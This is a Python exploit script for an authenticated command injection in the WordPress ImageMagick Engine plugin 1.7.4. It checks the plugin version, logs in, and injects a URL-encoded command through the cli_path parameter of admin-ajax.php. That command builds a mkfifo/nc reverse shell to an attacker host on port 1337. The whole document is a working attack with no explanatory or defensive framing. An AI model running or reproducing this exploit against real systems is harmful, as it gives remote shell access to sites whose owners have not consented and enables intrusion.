#!/usr/bin/ python

from pwn import *
from sys import exit
import requests
import subprocess


class Exploit:
    def __init__(self, url, username, password, rce_command):
        self.session = None
        self.url = url
        self.username = username
        self.password = password
        self.rce_command = rce_command
        self.p = log.progress("checking")
        self.local_port = 1337

    def check_version(self):
        r = requests.get(self.url+"/wp-content/plugins/imagemagick-engine/readme.txt")
        if "1.7.5" in r.text:
            self.p = log.warn("not vulnerable")
        elif "Stable tag: 1.7.4" in r.text:
            self.p = log.progress("vulnerable to rce")

    def login(self):
        self.session = requests.Session()
        login_url = self.url + "/wp-login.php"
        login_data = {
            "log": {self.username},
            "pwd": {self.password},
        }
        login_session = self.session.post(login_url, data=login_data)
        if "Error:" in login_session.text:
            self.p = log.warn("login failed!")
        if "Error:" not in login_session.text:
            self.p = log.progress("Successfully logged in")

    # def nc_server(self):
    #     subprocess.call(["nc", "-nlvp", str(self.local_port)])

    def rce_exploit(self):
        self.p = log.progress("Shell done")

        vuln_param = f"cli_path=d%3B{self.rce_command}%3Bwhoami"
        vuln_url = f"/wp-admin/admin-ajax.php?action=ime_test_im_path&{vuln_param}"
        rce_payload = self.url + vuln_url
        self.session.get(rce_payload)


if __name__ == "__main__":
    url_ip = "http://192.168.228.143"
    rce_command = "rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20192.168.228.128%201337%20%3E%2Ftmp%2Ff"
    exploit = Exploit(url_ip, "wordpress", "wordpress", rce_command)
    exploit.check_version()
    exploit.login()
    # exploit.nc_server()
    exploit.rce_exploit()

